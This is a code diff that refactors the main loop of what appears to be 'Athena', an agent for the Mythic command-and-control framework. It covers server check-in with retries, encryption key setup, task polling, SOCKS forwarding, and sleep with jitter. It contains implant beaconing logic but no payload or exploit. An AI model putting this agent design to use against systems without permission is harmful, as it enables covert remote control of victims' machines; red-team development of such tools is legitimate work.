@@ -48,12 +48,12 @@ namespace Athena
             bool exit = false;
 
             //MythicClient controls all of the agent communications
-            Globals.mc = new MythicClient();
+            MythicClient mc = new MythicClient();
 
             //First Checkin-In attempt
-            CheckinResponse res = await handleCheckin();
+            CheckinResponse res = await mc.handleCheckin();
             
-            if (!await updateAgentInfo(res))
+            if (!await mc.updateAgentInfo(res))
             {
                 Environment.Exit(0);
             }
@@ -66,9 +66,9 @@ namespace Athena
             {
                 try
                 {
-                    var delegateTask = Globals.mc.MythicConfig.forwarder.GetMessages();
-                    var socksTask = Globals.socksHandler.GetMessages();
-                    var responsesTask = Globals.mc.commandHandler.GetResponses();
+                    var delegateTask = mc.MythicConfig.forwarder.GetMessages();
+                    var socksTask = mc.socksHandler.GetMessages();
+                    var responsesTask = mc.commandHandler.GetResponses();
 
                     await Task.WhenAll(delegateTask, socksTask, responsesTask);
 
@@ -77,7 +77,7 @@ namespace Athena
                     List<object> responses = responsesTask.Result;
 
 
-                    List<MythicTask> tasks = await Globals.mc.GetTasks(responses, delegateMessages, socksMessages);
+                    List<MythicTask> tasks = await mc.GetTasks(responses, delegateMessages, socksMessages);
 
                     if(tasks is null)
                     {
@@ -87,7 +87,7 @@ namespace Athena
                         }
 
                         //Return responses to waiting queue
-                        await Globals.mc.commandHandler.AddResponse(responses);
+                        await mc.commandHandler.AddResponse(responses);
 
                         missedCheckins++;
                     }
@@ -95,7 +95,7 @@ namespace Athena
                     {
                         Parallel.ForEach(tasks, async c =>
                         {
-                            Task.Run(() => Globals.mc.commandHandler.StartJob(c));
+                            Task.Run(() => mc.commandHandler.StartJob(c));
                         });
 
                     }
@@ -108,73 +108,10 @@ namespace Athena
                         Environment.Exit(0);
                     }
                 }
-                await Task.Delay(await Misc.GetSleep(Globals.mc.MythicConfig.sleep, Globals.mc.MythicConfig.jitter) * 1000);
+                await Task.Delay(await Misc.GetSleep(mc.MythicConfig.sleep, mc.MythicConfig.jitter) * 1000);
             }
         }
 
-        /// <summary>
-        /// Perform initial checkin with the Mythic server
-        /// </summary>
-        private static async Task<CheckinResponse> handleCheckin()
-        {
-            int maxMissedCheckins = 3;
-            int missedCheckins = 0;
-            CheckinResponse res = await Globals.mc.CheckIn();
-
-            //Run in loop, just in case the agent is not able to connect initially to give a chance for network issues to resolve
-            while (res == null || res.status != "success")
-            {
-                //Attempt checkin again
-                try
-                {
-                    //Increment checkins
-                    missedCheckins += 1;
-
-                    if (missedCheckins == maxMissedCheckins)
-                    {
-                        //bye bye
-                        Environment.Exit(0);
-                    }
-
-                    //Keep Trying
-                    res = await Globals.mc.CheckIn();
-                }
-                catch (Exception e)
-                {
-                }
-                //Sleep before attempting checkin again
-                Thread.Sleep(await Misc.GetSleep(Globals.mc.MythicConfig.sleep, Globals.mc.MythicConfig.jitter) * 1000);
-            }
-            return res;
-        }
-
-        /// <summary>
-        /// Update the agent information on successful checkin with the Mythic server
-        /// </summary>
-        /// <param name="res">CheckIn Response</param>
-        private static async Task<bool> updateAgentInfo(CheckinResponse res)
-        {
-            try
-            {
-                Globals.mc.MythicConfig.uuid = res.id;
-                if (Globals.mc.MythicConfig.currentConfig.encrypted)
-                {
-                    if (Globals.mc.MythicConfig.currentConfig.encryptedExchangeCheck && !String.IsNullOrEmpty(res.encryption_key))
-                    {
-                        Globals.mc.MythicConfig.currentConfig.crypt = new PSKCrypto(res.id, res.encryption_key);
-                    }
-                    else
-                    {
-                        Globals.mc.MythicConfig.currentConfig.crypt = new PSKCrypto(res.id, Globals.mc.MythicConfig.currentConfig.psk);
-                    }
-                }
-                return true;
-            }
-            catch (Exception e)
-            {
-                return false;
-            }
-        }
 
     }
 }
